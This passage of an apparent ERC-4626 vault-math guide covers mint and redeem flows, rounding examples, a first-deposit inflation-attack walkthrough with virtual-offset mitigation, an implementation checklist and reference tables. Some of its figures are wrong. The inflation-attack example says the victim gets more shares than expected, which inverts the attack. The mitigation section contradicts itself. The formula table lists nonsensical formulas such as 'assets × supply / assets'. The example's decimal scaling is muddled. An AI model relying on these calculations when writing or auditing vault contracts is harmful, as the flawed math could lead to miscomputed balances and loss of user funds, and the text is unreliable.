│  - totalSupply += shares                       │
│  - balanceOf[user] += shares                   │
│                                                │
└────────────────────────────────────────────────┘
```

### User Flow: Mint

```
User wants exactly 1000 shares
        ↓
User calls mint(1000 ether)  // 1000 shares in smallest units
        ↓
Vault calculates assets needed
assets = 1000 × totalAssets / totalSupply
if fractional: assets += 1  (ROUND UP)
        ↓
Vault transfers assets from user to vault
asset.transferFrom(user, vault, assets)
        ↓
Vault mints EXACTLY 1000 shares to user
_mint(user, 1000)
        ↓
Event emitted: Deposit(user, user, assets, 1000)
        ↓
User has exactly 1000 shares (and lost 'assets' USDC)
```

### Mathematical Flow: Mint

```
┌────────────────────────────────────────────────┐
│ MINT FLOW                                      │
├────────────────────────────────────────────────┤
│                                                │
│  Input: shares (user wants this exact amount) │
│                                                │
│  Formula: assets = (shares × A + S - 1) / S   │
│           where S = totalSupply                │
│                 A = totalAssets                │
│  Rounding: UP (user pays more for certainty)  │
│                                                │
│  Output: assets (user must pay this much)      │
│                                                │
│  State Changes:                                │
│  - totalAssets += assets                       │
│  - totalSupply += shares                       │
│  - balanceOf[user] += shares                   │
│                                                │
└────────────────────────────────────────────────┘
```

### User Flow: Redeem

```
User wants to redeem 500 shares
        ↓
User calls redeem(500 ether, receiver, user)
        ↓
Vault calculates assets to return
assets = 500 × totalAssets / totalSupply
        ↓
Vault burns 500 shares from user
_burn(user, 500)
        ↓
Vault transfers assets to receiver
asset.transfer(receiver, assets)
        ↓
Event emitted: Withdraw(user, receiver, user, assets, 500)
        ↓
Receiver has assets, user has 500 fewer shares
```

### Mathematical Flow: Redeem

```
┌────────────────────────────────────────────────┐
│ REDEEM FLOW                                    │
├────────────────────────────────────────────────┤
│                                                │
│  Input: shares (user will give up this many)  │
│                                                │
│  Formula: assets = (shares × A) / S            │
│           where S = totalSupply                │
│                 A = totalAssets                │
│  Rounding: DOWN (user receives less)           │
│                                                │
│  Output: assets (user receives this much)      │
│                                                │
│  State Changes:                                │
│  - totalAssets -= assets                       │
│  - totalSupply -= shares                       │
│  - balanceOf[user] -= shares                   │
│                                                │
└────────────────────────────────────────────────┘
```

### Vault State Evolution

```
TIME 0 (Empty):
┌─────────────────────────────────────┐
│ Vault                               │
│ totalAssets = 0                     │
│ totalSupply = 0                     │
│ Share Price = undefined             │
└─────────────────────────────────────┘

TIME 1 (Alice deposits 100 assets):
┌─────────────────────────────────────┐
│ Vault                               │
│ totalAssets = 100                   │
│ totalSupply = 100 (shares)          │
│ Share Price = 1 asset/share         │
│ Alice: 100 shares                   │
└─────────────────────────────────────┘

TIME 2 (Vault earns 50 assets):
┌─────────────────────────────────────┐
│ Vault                               │
│ totalAssets = 150                   │
│ totalSupply = 100 (unchanged)       │
│ Share Price = 1.5 assets/share      │
│ Alice: 100 shares (worth 150)       │
└─────────────────────────────────────┘

TIME 3 (Bob deposits 150 assets):
shares = 150 × 100 / 150 = 100 shares
┌─────────────────────────────────────┐
│ Vault                               │
│ totalAssets = 300                   │
│ totalSupply = 200                   │
│ Share Price = 1.5 assets/share      │
│ Alice: 100 shares (worth 150)       │
│ Bob: 100 shares (worth 150)         │
└─────────────────────────────────────┘

TIME 4 (Alice redeems 50 shares):
assets = 50 × 300 / 200 = 75 assets
┌─────────────────────────────────────┐
│ Vault                               │
│ totalAssets = 225                   │
│ totalSupply = 150                   │
│ Share Price = 1.5 assets/share      │
│ Alice: 50 shares (worth 75)         │
│ Bob: 100 shares (worth 150)         │
└─────────────────────────────────────┘
```

---

## Example Calculations

### Example 1: Basic Deposit and Earn

**Initial State**:
```
totalAssets = 1000 USDC
totalSupply = 500 shares
Share price = 1000 / 500 = 2 USDC per share
```

**User Action**: Deposit 100 USDC

**Calculation**:
```
shares = 100 × 500 / 1000
shares = 50000 / 1000
shares = 50 shares
```

**After Deposit**:
```
totalAssets = 1000 + 100 = 1100 USDC
totalSupply = 500 + 50 = 550 shares
Share price = 1100 / 550 = 2 USDC per share (unchanged)
User has 50 shares
```

**After Vault Earns 110 USDC**:
```
totalAssets = 1100 + 110 = 1210 USDC
totalSupply = 550 shares (unchanged)
Share price = 1210 / 550 = 2.2 USDC per share (increased)
```

**User's Wealth**:
```
User shares: 50
User wealth = 50 × 2.2 = 110 USDC
Original deposit: 100 USDC
Profit: 10 USDC
Proportional return: 10% (same as vault)
```

### Example 2: First Deposit in Empty Vault

**Initial State**:
```
totalAssets = 0
totalSupply = 0
```

**User Action**: Deposit 100 USDC (with 18 decimal shares, 6 decimal asset)

**Calculation**:
```
Since totalSupply == 0:
shares = assets × 10^decimals / 10^asset.decimals
shares = 100 × 10^18 / 10^6
shares = 100 × 10^12
shares = 10^14 shares
```

**After Deposit**:
```
totalAssets = 100 USDC (10^8 wei)
totalSupply = 10^14 shares
Share price = 10^8 / 10^14 = 10^-6 USDC per share
```

This establishes 1:10^6 ratio between assets (in wei) and shares, giving shares meaningful precision.

### Example 3: Mint with Rounding Up

**Vault State**:
```
totalAssets = 1000
totalSupply = 999
Share price = 1000 / 999 ≈ 1.001 USDC per share
```

**User Action**: Mint exactly 333 shares

**Calculation** (standard division):
```
assets = 333 × 1000 / 999
assets = 333000 / 999
assets = 333.333... (before rounding)
```

**Rounding Up** (for mint):
```
assets = (333 × 1000 + 999 - 1) / 999
assets = (333000 + 998) / 999
assets = 333998 / 999
assets = 334 (rounded up)
```

**After Mint**:
```
totalAssets = 1000 + 334 = 1334
totalSupply = 999 + 333 = 1332
Share price = 1334 / 1332 ≈ 1.0015 USDC per share
```

**Analysis**:
- User paid 334 assets for 333 shares
- 1 asset went to vault surplus (rounded up)
- Vault is protected

### Example 4: Withdraw with Rounding Up

**Vault State**:
```
totalAssets = 1500
totalSupply = 1000
Share price = 1500 / 1000 = 1.5 USDC per share
```

**User Action**: Withdraw exactly 300 assets

**Calculation**:
```
shares = 300 × 1000 / 1500
shares = 300000 / 1500
shares = 200 (exactly)
```

**No rounding needed in this case**, but if there were:

Alternative vault state:
```
totalAssets = 1500
totalSupply = 1001
Share price = 1500 / 1001 ≈ 1.4985 USDC per share
```

**Calculation with rounding**:
```
shares = (300 × 1001 + 1500 - 1) / 1500
shares = (300300 + 1499) / 1500
shares = 301799 / 1500
shares = 201 (rounded up)
```

**After Withdraw**:
```
totalAssets = 1500 - 300 = 1200
totalSupply = 1001 - 201 = 800
Share price = 1200 / 800 = 1.5 (unchanged)
```

**Analysis**:
- User withdrew 300 assets by burning 201 shares
- Had to burn 1 extra share due to rounding
- Vault is protected

### Example 5: The Rounding Impact Over Time

**Scenario**: Users repeatedly deposit and withdraw small amounts

**Initial Vault**:
```
totalAssets = 1000000
totalSupply = 1000000
Price = 1.0
```

**Round 1 - User deposits 1 asset with DOWN rounding**:
```
shares = 1 × 1000000 / 1000000 = 1 share (no rounding)
Vault: 1000001 assets, 1000001 shares
```

**Round 2 - User deposits 1 asset with DOWN rounding**:
```
shares = 1 × 1000001 / 1000001 = 1 share (no rounding)
Vault: 1000002 assets, 1000002 shares
```

**Round 3 - User deposits 2 assets with DOWN rounding**:
```
shares = 2 × 1000002 / 1000002 = 2 shares (no rounding)
Vault: 1000004 assets, 1000004 shares
```

**Pattern**: With DOWN rounding on small deposits, the vault never gains or loses from rounding in simple cases.

**Now with fractional share price** (1500 assets / 1000 shares):

**User deposits 1000 assets**:
```
shares = 1000 × 1000 / 1500 = 1000000 / 1500 = 666.666...
Rounded DOWN: 666 shares
Lost to rounding: 0.666 shares
```

**After many deposits**:
```
Accumulated rounding loss: significant
These fractions accumulate in the vault
Vault becomes slightly more valuable
Early depositors benefit from accumulated dust
```

### Example 6: Preventing Inflation Attack

**Attack Scenario (Without Protection)**:

Step 1 - Attacker deposits 1 wei:
```
shares = 1 × 10^18 / 1 = 10^18 shares
Vault: 1 asset, 10^18 shares
```

Step 2 - Attacker transfers 10^15 assets directly:
```
Vault: 10^15 + 1 assets, 10^18 shares
Share price: 10^15 / 10^18 = 10^-3 assets per share
```

Step 3 - Innocent user deposits 10^9 assets:
```
shares = 10^9 × 10^18 / (10^15 + 1)
shares ≈ 10^27 / 10^15
shares ≈ 10^12 shares

User gets 10^12 shares instead of ~10^9 shares they expected
Attacker's 10^18 shares now worth ~10^15 assets
Profit: 10^15 - 1 = effectively unlimited
```

**With Virtual Offset Protection** (offset = 10^6):

Step 1 - Attacker deposits 1 wei:
```
shares = 1 × (10^18 + 10^6) / (1 + 10^6)
shares ≈ 10^18 shares (approximately same)
```

Step 2 - Attacker transfers 10^15 assets:
```
New share price calculation:
shares = assets × (supply + offset) / (assets + offset)
shares = 10^9 × (10^18 + 10^6) / (10^15 + 10^6)
shares ≈ 10^9 × 10^18 / 10^15
shares ≈ 10^12 shares (same as before!)

BUT with offset considered:
Effective price = (10^15 + 10^6) / (10^18 + 10^6)
               ≈ 10^15 / 10^18
               = 10^-3 assets per share

Attacker's profit reduced from 10^15 to only ~10^6
Cost of attack (10^15) >> profit (10^6)
Attack no longer profitable!
```

---

## Implementation Checklist

### Core Functions

- [ ] `deposit(uint256 assets, address receiver) → uint256 shares`
  - [ ] Handles zero supply (first deposit)
  - [ ] Correct rounding (DOWN)
  - [ ] Prevents rounding to zero
  - [ ] Transfers assets correctly
  - [ ] Mints shares correctly
  - [ ] Emits Deposit event

- [ ] `mint(uint256 shares, address receiver) → uint256 assets`
  - [ ] Calculates assets with UP rounding
  - [ ] Prevents rounding to zero
  - [ ] Transfers assets correctly
  - [ ] Mints exact shares
  - [ ] Emits Deposit event

- [ ] `withdraw(uint256 assets, address receiver, address owner) → uint256 shares`
  - [ ] Calculates shares with UP rounding
  - [ ] Handles approvals correctly
  - [ ] Burns shares correctly
  - [ ] Transfers assets correctly
  - [ ] Emits Withdraw event

- [ ] `redeem(uint256 shares, address receiver, address owner) → uint256 assets`
  - [ ] Calculates assets with DOWN rounding
  - [ ] Handles approvals correctly
  - [ ] Burns shares correctly
  - [ ] Transfers assets correctly
  - [ ] Emits Withdraw event

### Preview Functions

- [ ] `previewDeposit(uint256 assets) → uint256 shares`
  - [ ] Returns same value as `deposit()` would
  - [ ] Uses DOWN rounding
  - [ ] Never reverts

- [ ] `previewMint(uint256 shares) → uint256 assets`
  - [ ] Returns same value as `mint()` would
  - [ ] Uses UP rounding
  - [ ] Never reverts

- [ ] `previewWithdraw(uint256 assets) → uint256 shares`
  - [ ] Returns same value as `withdraw()` would
  - [ ] Uses UP rounding
  - [ ] Never reverts

- [ ] `previewRedeem(uint256 shares) → uint256 assets`
  - [ ] Returns same value as `redeem()` would
  - [ ] Uses DOWN rounding
  - [ ] Never reverts

### Utility Functions

- [ ] `convertToShares(uint256 assets) → uint256`
  - [ ] Handles zero supply
  - [ ] Correct rounding per context
  - [ ] Handles overflow risks

- [ ] `convertToAssets(uint256 shares) → uint256`
  - [ ] Handles zero supply
  - [ ] Correct rounding per context
  - [ ] Handles overflow risks

### Security

- [ ] First deposit inflation attack mitigation
  - [ ] Virtual offset OR minimum deposit OR dead shares
  - [ ] Tested with exploit

- [ ] Rounding to zero prevention
  - [ ] All functions check `shares > 0` or `assets > 0`
  - [ ] Error messages clear

- [ ] Overflow protection
  - [ ] Tested with large numbers
  - [ ] Safe operation ordering

- [ ] Edge cases handled
  - [ ] Empty vault (0 assets, 0 supply)
  - [ ] Drained vault (0 assets, > 0 supply)
  - [ ] Single share
  - [ ] Decimal mismatches

### Testing

- [ ] Unit tests for each function
- [ ] Integration tests (deposit → earn → withdraw)
- [ ] Rounding tests
  - [ ] Verify DOWN rounding on deposits/redeems
  - [ ] Verify UP rounding on mints/withdraws
  - [ ] Test fractional amounts

- [ ] Attack tests
  - [ ] First deposit inflation attack
  - [ ] Rounding arbitrage
  - [ ] Flash loan attacks (if applicable)

- [ ] Property tests
  - [ ] totalAssets always ≥ sum of redeemable assets
  - [ ] totalSupply consistency
  - [ ] Share price monotonicity (with profits)
  - [ ] No funds created or destroyed via rounding

### Documentation

- [ ] Function documentation with formulas
- [ ] Explanation of rounding choices
- [ ] Examples in comments
- [ ] Known limitations documented

---

## Quick Reference Tables

### Rounding Quick Reference

| Function | Direction | Reason | Code |
|----------|-----------|--------|------|
| `deposit()` | DOWN | User gets less | Direct division |
| `mint()` | UP | Vault gets more | `(a * b + c - 1) / c` |
| `withdraw()` | UP | User pays more | `(a * b + c - 1) / c` |
| `redeem()` | DOWN | User gets less | Direct division |

### Formula Quick Reference

| Conversion | Formula | When to Use |
|------------|---------|-------------|
| Assets → Shares (deposit) | `assets × supply / assets` | Deposit flow |
| Shares → Assets (mint) | `shares × assets / supply` | Mint flow |
| Assets → Shares (withdraw) | `assets × supply / assets` | Withdrawal flow |
| Shares → Assets (redeem) | `shares × assets / supply` | Redemption flow |

### Edge Cases Quick Reference

| Case | Behavior | Solution |
|------|----------|----------|
| Empty vault | Division by zero | Return `assets × 10^decimals` |
| Rounding to zero | Lost deposit | Check `shares > 0` |
| Very small ratio | Precision loss | Scale up calculations |
| Overflow | Integer overflow | Reorder operations |
| Inflation attack | Share price spike | Virtual offset / minimum deposit |

---

## Additional Resources

### Related EIP-4626 Documents

- Original Proposal: https://eips.ethereum.org/EIPS/eip-4626
- Reference Implementation: OpenZeppelin's ERC4626

### Testing Libraries

- Foundry (Solidity testing)
- Hardhat (TypeScript testing)
- Property-based testing: Echidna, Medusa

### Security Considerations

- Trail of Bits ERC-4626 audit findings
- Euler Finance vault exploits (learning resources)
- Yearn vault patterns

---

## Summary

ERC-4626 vault mathematics is elegantly simple in concept but requires careful implementation:

1. **Core Principle**: Shares represent proportional ownership
2. **Key Insight**: Price per share = Total Assets / Total Shares
3. **Rounding Rule**: Always round against users on outputs
4. **Critical Protection**: Prevent first deposit inflation attack
5. **Testing Essential**: Property-based testing catches subtle bugs

The formulas are universal, but the rounding directions and edge case handling are where implementations differ. Follow the checklist carefully and test thoroughly.

---

*Last Updated: November 2024*
*This guide is comprehensive but not a substitute for professional security auditing.*
